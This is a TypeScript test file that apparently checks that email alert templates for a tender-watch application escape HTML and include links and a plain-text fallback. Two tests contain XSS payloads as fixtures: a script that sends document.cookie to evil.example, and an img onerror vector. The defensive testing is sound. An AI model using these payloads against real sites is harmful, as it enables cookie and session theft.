import { describe, expect, it } from "vitest";
import { buildDailyDigestEmail, buildImmediateMatchEmail, escapeHtml } from "./email-alert-templates";

describe("email-alert-templates — mission §76/§77/§78/§79/§133 (XSS)", () => {
  it("escapeHtml neutralizes the 5 significant HTML characters", () => {
    expect(escapeHtml(`<script>alert('xss')</script>`)).toBe("&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;");
    expect(escapeHtml(`A & B "quoted"`)).toBe("A &amp; B &quot;quoted&quot;");
  });

  it("BLOQUANT — a malicious external tender title never reaches the immediate-match email HTML unescaped", () => {
    const maliciousTitle = `<script>document.location='https://evil.example/steal?c='+document.cookie</script>`;
    const message = buildImmediateMatchEmail({
      savedSearchName: "Cybersécurité",
      item: { tenderId: "et-1", tenderTitle: maliciousTitle, score: 90, matchReasonLabels: [] },
      baseUrl: "https://app.tenderos.example",
    });
    expect(message.html).not.toContain("<script>document.location");
    expect(message.html).toContain("&lt;script&gt;");
  });

  it("BLOQUANT — a malicious buyer name never reaches the digest email HTML unescaped", () => {
    const maliciousBuyer = `"><img src=x onerror=alert(1)>`;
    const message = buildDailyDigestEmail({
      savedSearchName: "Nettoyage",
      items: [{ tenderId: "et-1", tenderTitle: "Marché normal", buyerName: maliciousBuyer, score: 80, matchReasonLabels: [] }],
      baseUrl: "https://app.tenderos.example",
    });
    expect(message.html).not.toContain("<img src=x onerror=alert(1)>");
  });

  it("mission §46 — the email links to TenderOS, never embeds a full DCE/document content", () => {
    const message = buildImmediateMatchEmail({ savedSearchName: "Test", item: { tenderId: "et-1", tenderTitle: "Marché", score: 80, matchReasonLabels: [] }, baseUrl: "https://app.tenderos.example" });
    expect(message.html).toContain("https://app.tenderos.example/app/market-watch/et-1");
  });

  it("mission §109 — a plain-text fallback is always produced alongside HTML", () => {
    const message = buildImmediateMatchEmail({ savedSearchName: "Test", item: { tenderId: "et-1", tenderTitle: "Marché", score: 80, matchReasonLabels: [] }, baseUrl: "https://app.tenderos.example" });
    expect(message.text.length).toBeGreaterThan(0);
    expect(message.text).not.toContain("<");
  });
});
